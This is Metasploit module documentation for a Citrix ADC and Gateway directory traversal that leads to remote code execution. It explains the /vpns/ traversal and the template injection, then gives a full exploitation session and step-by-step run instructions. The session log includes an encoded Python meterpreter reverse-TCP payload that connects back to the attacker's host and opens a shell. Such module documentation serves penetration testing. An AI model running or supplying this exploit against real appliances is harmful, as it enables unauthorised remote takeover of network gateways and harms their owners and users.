## Introduction

An issue was discovered in Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0. They allow Directory Traversal.

In resume, when the NSPPE receives a request for `GET /vpn/index.html`, it is supposed to send this request to Apache which processes it. However, by making the request `GET /vpn/../vpns/` (which is not sanitized), Apache transforms the route into `GET /vpns/` and processes this last request normally.

This `/vpns/` directory is interesting because it contains Perl code. The script `newbm.pl` creates an array containing information from several parameters, then calls the filewrite function, which writes the content to an XML file on disk.

A malicious attacker can execute arbitrary commands remotely by creating a corrupted xml file who use `Perl Template Toolkit` in part of payload.

```
msf5 exploit(unix/webapp/citrix_dir_trasversal_rce) > set rhosts [IP]
rhosts => XXX.XXX.XXX.XXX
msf5 exploit(unix/webapp/citrix_dir_trasversal_rce) > set lhost [IP]
lhost => XXX.XXX.XXX.XXX
msf5 exploit(unix/webapp/citrix_dir_trasversal_rce) > set verbose true
verbose => true
msf5 exploit(unix/webapp/citrix_dir_trasversal_rce) > run

[*] Started reverse TCP handler on XXX.XXX.XXX.XXX:4444 
[+] The target appears to be vulnerable.
[*] Sending python/meterpreter/reverse_tcp command payload
[*] Generated command payload: import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJ1hYWC5YWFguWFhYLlhYWCcsNDQ0NCkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))
[*] Bookmark Added.
[*] Sending stage (53755 bytes) to XXX.XXX.XXX.XXX
[*] Meterpreter session 1 opened (XXX.XXX.XXX.XXX:4444 -> XXX.XXX.XXX.XXX:42881) at 2020-01-13 12:02:41 +0400
[+] Deleted /var/tmp/netscaler/portal/templates/hBgGdPlkypbfZMvq.xml.ttc2
[+] Deleted /netscaler/portal/templates/hBgGdPlkypbfZMvq.xml

meterpreter > 
```

## Verification Steps

1. Install the module as usual
2. Start msfconsole
3. Do: `use exploit/unix/webapp/citrix_dir_trasversal_rce`
4. Do: `set RHOSTS [IP]`
5. Do: `set LHOST [IP]`
6. Do: `set VERBOSE true`
7. Do: `run`

## Targets

```
  Id  Name
  --  ----
  0   Python (meterpreter)
  1   Unix (remote shell)
  2   Unix (command-line)
```

## Advanced options

**ForceExploit**

Override check result.

## References

  1. <https://www.mdsec.co.uk/2020/01/deep-dive-to-citrix-adc-remote-code-execution-cve-2019-19781/>
  2. <https://www.exploit-db.com/exploits/47901>
  3. <https://www.exploit-db.com/exploits/47902>
